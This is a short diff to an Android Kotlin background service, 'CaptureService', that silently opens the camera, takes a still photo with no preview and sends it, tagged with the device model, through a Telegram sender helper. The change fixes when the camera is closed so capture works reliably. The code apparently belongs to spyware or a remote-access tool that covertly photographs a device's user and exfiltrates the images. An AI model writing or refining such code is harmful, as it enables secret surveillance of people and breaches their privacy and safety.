@@ -204,22 +204,27 @@ class CaptureService : Service() {
 
     private suspend fun takePhotoAndSend() = suspendCoroutine<Unit> { cont ->
         val cm = getSystemService(CAMERA_SERVICE) as CameraManager
-        val id = cameraId ?: run { TgSender.sendMessage("❌ Kamera tidak ditemukan"); cont.resume(Unit); return@suspendCoroutine }
+        val id = cameraId
+        if (id == null) { TgSender.sendMessage("❌ Kamera tidak ditemukan"); cont.resume(Unit); return@suspendCoroutine }
         try {
-            val size = cm.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!.getOutputSizes(ImageFormat.JPEG)?.firstOrNull() ?: run { cont.resume(Unit); return@suspendCoroutine }
+            val size = cm.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
+            if (size == null) { cont.resume(Unit); return@suspendCoroutine }
             val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
             reader.setOnImageAvailableListener({ r ->
                 val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                 val buf = img.planes[0].buffer; val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                 img.close(); r.close(); scope.launch { TgSender.sendPhoto(bytes, "📸 ${Build.MODEL}"); cont.resume(Unit) }
             }, Handler(Looper.getMainLooper()))
-            
             cm.openCamera(id, object : CameraDevice.StateCallback() {
                 override fun onOpened(dev: CameraDevice) {
                     dev.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                         override fun onConfigured(s: CameraCaptureSession) {
                             val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE); req.addTarget(reader.surface)
-                            s.capture(req.build(), null, null); dev.close()
+                            s.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
+                                override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
+                                    dev.close()
+                                }
+                            }, null)
                         }
                         override fun onConfigureFailed(s: CameraCaptureSession) { dev.close(); TgSender.sendMessage("❌ Gagal capture"); cont.resume(Unit) }
                     }, null)
